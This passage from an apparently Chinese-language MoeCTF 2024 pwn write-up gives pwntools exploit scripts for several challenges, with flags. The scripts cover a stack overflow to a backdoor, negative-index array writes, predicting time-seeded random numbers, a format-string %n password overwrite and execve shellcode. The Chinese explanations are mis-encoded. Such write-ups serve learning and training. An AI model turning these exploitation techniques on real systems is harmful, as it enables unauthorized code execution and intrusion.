</span></span><span style="display:flex;"><span>        question <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;=&#34;</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;=&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>,<span style="color:#e6db74">&#34;//&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#print (question)</span>
</span></span><span style="display:flex;"><span>        answer <span style="color:#f92672">=</span> str(eval(question))<span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(answer)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>è¿è¡Œç»“æœ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ä½ è¿‡å…³ã€‚
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>ArIthMEtlC-iS_noT_M@Them@tIc5f1720<span style="color:#f92672">}</span>
</span></span></code></pre></div><hr>
<h2 id="no_more_gets">no_more_gets<a hidden class="anchor" aria-hidden="true" href="#no_more_gets">#</a></h2>
<p>åŸºç¡€çš„æ ˆæº¢å‡ºï¼Œæ³¨æ„æ ˆå¯¹é½å³å¯æ‹¿åˆ°shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">53741</span>)
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>backdoor_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401176</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(offset) <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(backdoor_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;This is my own shell, enter the password or get out.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#moectf{G3ts_StriNG-thUs-GEts_FLag37495d75}</span>
</span></span></code></pre></div><hr>
<h2 id="moeplane">Moeplane<a hidden class="anchor" aria-hidden="true" href="#moeplane">#</a></h2>
<p><img loading="lazy" src="/images/MoeCTF2024/PWN/2.png"></p>
<p>æ²¡æœ‰å¯¹æ•°ç»„ <code>engine_thrust</code> çš„ <code>index</code> ä½œé™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥ç”¨è´Ÿæ•°è¦†ç›– <code>flight</code> ä¸Šçš„æ•°æ®ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">27818</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-15&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, str(<span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-16&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, str(<span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-17&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, str(<span style="color:#ae81ff">0x30</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-18&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, str(<span style="color:#ae81ff">0x40</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-19&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, str(<span style="color:#ae81ff">0x50</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#moectf{compUt3r_fallur3_WOnt_leT_YOu_fly524785}</span>
</span></span></code></pre></div><hr>
<h2 id="leak_sth">leak_sth<a hidden class="anchor" aria-hidden="true" href="#leak_sth">#</a></h2>
<p>éšæœºæ•°æŒ‘æˆ˜ï¼Œç§å­æ˜¯å½“å‰æ—¶é—´ï¼Œæ¯æ¬¡éƒ½ä¸åŒï¼Œpythoné‡Œè°ƒç”¨Cåº“å‡½æ•°å³å¯ç”ŸæˆåŒæ ·çš„éšæœºæ•°å®ŒæˆæŒ‘æˆ˜æ‹¿åˆ°shell</p>
<p>ä¸è¿‡æ³¨æ„<code>%ld</code>è¡¨ç¤ºæœ‰ç¬¦å·é•¿æ•´å‹ï¼ŒèŒƒå›´ä¸º <code>-2147483648 ~ 2147483647</code>ï¼ˆ10ä½åè¿›åˆ¶æ•°ï¼‰</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>) 
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#elf = ELF(&#34;./pwn&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./pwn&#34;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">18156</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>seed <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>time(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>srand(seed)
</span></span><span style="display:flex;"><span>challenge_num <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand()
</span></span><span style="display:flex;"><span>print (challenge_num)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;What&#39;s your name?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w8nn9z&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Give me the number</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(challenge_num)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#moectf{YOU_aRe_1ukY_Or_clEv3R29ef66bc}</span>
</span></span></code></pre></div><hr>
<h2 id="loginsystem">LoginSystem<a hidden class="anchor" aria-hidden="true" href="#loginsystem">#</a></h2>
<p>è¾“å‡ºç”¨æˆ·åå¤„å­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆfmtï¼‰ï¼Œgdbè°ƒè¯•å¯ä»¥çŸ¥é“åç§»ä¸º8ï¼Œä¸»è¦æ˜¯é€šè¿‡printfå’Œ%nè¾¾æˆè¦†ç›–passwordåœ°å€å†…å®¹çš„ç›®çš„ï¼Œè¿›è€Œæ‹¿shell</p>
<p>ä¸€å¼€å§‹è¿˜æƒ³ç€æ€ä¹ˆç¼©çŸ­payloadï¼Œåæ¥æƒ³äº†æƒ³è¾“å…¥b&quot;\x00&quot;å‹çš„passwordå°±å¯ä»¥äº†ï¼Œä¸ç”¨æ˜¯å¯æ‰“å°å­—ç¬¦ï¼Œæœ¬åœ°å¤šè°ƒè¯•å‡ æ¬¡å°±èƒ½å‡º</p>
<p>è¿™é¢˜æˆ‘è‡ªå·±åœ¨ç”¨fmtstr_payloadçš„æ—¶å€™ä¼šå‡ºé—®é¢˜ï¼Œç›´æ¥æ‰‹åŠ¨æ„é€ äº†ï¼ˆ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#from ctypes import *</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#libc = cdll.LoadLibrary(&#34;./libc.so.6&#34;) </span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./pwn&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./pwn&#34;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">19336</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%2c</span><span style="color:#e6db74">%9$ln&#34;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x404050</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;username: &#34;</span>,payload)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p)</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;! Please input your password: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#moectf{Oh_You_cAn_6YP4SS_THE_P@5sWORD235e525}</span>
</span></span></code></pre></div><hr>
<h2 id="ez_shellcode">ez_shellcode<a hidden class="anchor" aria-hidden="true" href="#ez_shellcode">#</a></h2>
<p>æ²¡å¼€NXï¼Œå¾€æ ˆä¸Šå†™å…¥shellcodeå¯ä»¥è¢«æ‰§è¡Œï¼Œè€ƒè™‘åˆ°æœ‰å¯¹shellcodeçš„é•¿åº¦é™åˆ¶ï¼Œä¸€å¼€å§‹ç›´æ¥ç”¨äº†ä¸ª23é•¿åº¦çš„64ä½ç¨‹åºçš„shellcodeæ¢­äº†ï¼Œåæ¥è‡ªå·±åˆå†™äº†ä¸€ä¸ªç®€å•çš„ç³»ç»Ÿè°ƒç”¨çš„shellcodeï¼Œéƒ½èƒ½æ‰“é€š</p>
<p>ä¸è¿‡è¿™é¢˜æœ‰ä¸ªåœ°å€éšæœºåŒ–ï¼Œshellcodeå†™åœ¨æ³„éœ²çš„nbytes_4çš„åœ°å€ä¸Šå³å¯</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#from ctypes import *</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#libc = cdll.LoadLibrary(&#34;./libc.so.6&#34;) </span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./pwn&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./pwn&#34;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">29972</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Tell me your age:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1000&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Here is a gift for you :</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>nbytes_4_addr <span style="color:#f92672">=</span> int((p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">14</span>)),base<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print (hex(nbytes_4_addr))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#shellcode = b&#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rax,59
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rbx,0x0068732f6e69622f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	push rbx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rdi,rsp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rsi,0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rdx,0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print (len(shellcode))  37</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> shellcode<span style="color:#f92672">.</span>ljust(offset)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(nbytes_4_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;What do you want to say?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#moectf{WE1l_D0ne-my-fRieND4ce76b7954}</span>
</span></span></code></pre></div><hr>
<h2 id="è¿™æ˜¯ä»€ä¹ˆrandom">è¿™æ˜¯ä»€ä¹ˆï¼Ÿrandomï¼<a hidden class="anchor" aria-hidden="true" href="#è¿™æ˜¯ä»€ä¹ˆrandom">#</a></h2>
<p>å…ˆç®€å•çœ‹çœ‹ä»£ç é€»è¾‘ï¼Œæ˜¯ä¸€ä¸ª 0xA + 2 æ¬¡çš„éšæœºæ•°éªŒè¯ï¼Œä½†æœ€åä¸¤ä¸ªæ— è®ºæ˜¯å¦æ­£ç¡®éƒ½ä¸ä¼šé€€å‡ºç¨‹åºï¼Œæ‰€ä»¥åªéœ€å‰é¢çš„ 0xA æ¬¡æ­£ç¡®å³å¯ï¼Œä¸è¿‡è¿™é“é¢˜çš„ç§å­ç”Ÿæˆç”¨åˆ°äº†localtimeï¼Œæ„Ÿè§‰åœ¨pythonä¸­æ¯”è¾ƒéš¾å®ç°æŒ‡é’ˆï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  timer <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(<span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">localtime</span>(<span style="color:#f92672">&amp;</span>timer);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">srandom</span>(v3<span style="color:#f92672">-&gt;</span>tm_yday);
</span></span></code></pre></div><p>ä¹Ÿå°±æ˜¯è¯´æœ€åçš„seedæ˜¯v3-&gt;tm_ydayï¼Œåæ¥äº†è§£äº†localtimeçš„ç”¨æ³•ï¼Œæ¯ä¸€å¤©å¯¹åº”çš„tm_ydayæ˜¯å›ºå®šçš„ï¼Œè¡¨ç¤ºä¸€å¹´ä¸­çš„ç¬¬å‡ å¤©ï¼Œå¯ä»¥å…ˆå†™ä¸€ä¸ªCè¯­è¨€ä»£ç å¼„å‡ºseedæ¥å†ç”¨pythonå†™äº¤äº’è„šæœ¬ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span> () {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> tm <span style="color:#f92672">*</span>v3;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">time_t</span> timer;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> secret;
</span></span><span style="display:flex;"><span>    timer <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">localtime</span>(<span style="color:#f92672">&amp;</span>timer);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">srandom</span>(v3<span style="color:#f92672">-&gt;</span>tm_yday);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v3<span style="color:#f92672">-&gt;</span>tm_yday); 
</span></span><span style="display:flex;"><span>    secret <span style="color:#f92672">=</span> <span style="color:#a6e22e">random</span>() <span style="color:#f92672">%</span> <span style="color:#ae81ff">90000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">10000</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,secret);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>æˆ‘åšæ­¤é¢˜æ—¥æœŸæ˜¯8.19ï¼Œæ‰€ä»¥seedæ˜¯231ï¼Œcè¯­è¨€ä»£ç è¿è¡Œç»“æœä¹Ÿæ˜¯å¦‚æ­¤ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./a.out                              
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">231</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">48149</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>) 
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#elf = ELF(&#34;./pwn&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./pwn&#34;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">1307</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>srand(<span style="color:#ae81ff">231</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xA</span>):
</span></span><span style="display:flex;"><span>	challenge_num <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>random() <span style="color:#f92672">%</span> <span style="color:#ae81ff">90000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">10000</span>
</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Guess a five-digit number I&#39;m thinking of</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>,str(challenge_num)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#åœ¨æ­¤ä¹‹åè¿˜è¦å†äº¤äº’ä¸¤æ¬¡ï¼Œéšä¾¿è¾“ä»€ä¹ˆæ•°å­—ï¼Œä¿è¯ç¨‹åºå¾€ä¸‹è¿›è¡Œè¾“å‡ºflagå³å¯</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#moectf{ranDOM_NUMBer5-AR3_pr3D1cT4BI3607f0c}</span>
</span></span></code></pre></div><hr>
